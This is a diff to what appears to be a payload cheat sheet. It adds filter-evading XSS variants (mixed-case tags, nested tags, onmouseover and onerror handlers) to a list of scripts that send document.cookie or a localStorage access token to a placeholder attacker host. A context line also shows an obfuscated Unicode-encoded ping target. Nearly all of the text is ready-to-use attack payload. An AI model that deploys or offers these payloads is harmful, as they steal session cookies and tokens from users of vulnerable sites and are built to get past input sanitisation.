@@ -180,6 +180,11 @@ ping %E2%91%A0%E2%91%A1%E2%91%A6.%E2%93%AA.%E2%93%AA.%E2%91%A0
 
 ==> XSS injection
 <script>var x;x=document.cookie; document.location.replace('http://<ATTACKER-IP>/c=1&cc='+x)</script>
+<ScRIpt>var x;x=document.cookie; document.location.replace('http://<ATTACKER-IP>/c=1&cc='+x)</scrIPt>
+<script>var x;x=document.cookie; document.location.replace('http://<ATTACKER-IP>/c=1&cc='+x)</script><script>var x;x=document.cookie; document.location.replace('http://<ATTACKER-IP>/c=1&cc='+x)</script>
+<u/onmouseover="var x;x=document.cookie; document.location.replace('http://<ATTACKER-IP>/c=1&cc='+x)";//>hello
+<img src=x onerror=""var x;x=document.cookie; document.location.replace('http://<ATTACKER-IP>/c=1&cc='+x)""//
+<scr<script>ipt>var x;x=document.cookie; document.location.replace('http://<ATTACKER-IP>/c=1&cc='+x)</scr</script>ipt>
 <script>var x;x=localStorage.getItem('access_token'); document.location.replace('http://<ATTACKER-IP>/c=2&cc='+x)</script>
 <script>document.location='http://<ATTACKER-IP>/?c=3&cc='+btoa(document.cookie)</script>
 <script>document.location='http://<ATTACKER-IP>/?c=4&cc='+btoa(localStorage.getItem('access_token'))</script>
